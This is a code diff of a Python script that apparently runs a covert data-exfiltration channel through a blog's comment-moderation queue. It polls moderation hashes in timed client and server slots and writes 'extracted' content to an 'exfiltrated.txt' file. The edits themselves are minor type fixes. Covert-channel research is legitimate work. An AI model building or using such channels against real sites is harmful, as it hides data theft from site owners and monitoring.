@@ -14,8 +14,8 @@ ack_channel_id = 7
 exfil_channel = "2021/08/13/exfil-channel/"
 ack_channel = "2021/08/13/ack-channel/"
 
-server_time_slot = "2:22"
-client_time_slot = "1:11"
+server_time_slot = 22
+client_time_slot = 11
 
 comment_index = 0
 prev_unapproved_index = 0
@@ -74,12 +74,12 @@ if prev_unapproved_index == 0:
 
 loop_counter = 99
 while(loop_counter > 0):
-    print("[INFO] Delaying to client timeslot. " + client_time_slot);
+    print("[INFO] Delaying to client timeslot. " + str(client_time_slot))
     delay_to_timeslot(client_time_slot)
     current_hash, server_index = get_moderation_hash_at_current_time()
 
     print("[INFO] Current hash is: " + current_hash)
-    print("[INFO] Delaying to server timeslot. " + server_time_slot);
+    print("[INFO] Delaying to server timeslot. " + str(server_time_slot))
 
     delay_to_timeslot(server_time_slot)
 
@@ -111,7 +111,7 @@ while(loop_counter > 0):
                 if elem and elem.string:
                     exfil_content = str(elem.string).strip()
                     to_write = str(datetime.datetime.utcnow()) + ": "
-                    to_write += "Extracted data with timeslot of " + client_time_slot + ": " + exfil_content + "\n"
+                    to_write += "Extracted data with timeslot of " + str(client_time_slot) + ": " + exfil_content + "\n"
                     print("[INFO] " + to_write);
                     f = open("../output/exfiltrated.txt", "a")
                     f.write(to_write)
@@ -126,7 +126,7 @@ while(loop_counter > 0):
                     
                     break
             else:
-                print("[INFO] No comment for moderation for " + client_time_slot + " using index " + str(current_unapproved_index) + ". Skipping...")
+                print("[INFO] No comment for moderation for " + str(client_time_slot) + " using index " + str(current_unapproved_index) + ". Skipping...")
         index_client += 1
 
     prev_unapproved_index = get_current_unapproved_index()
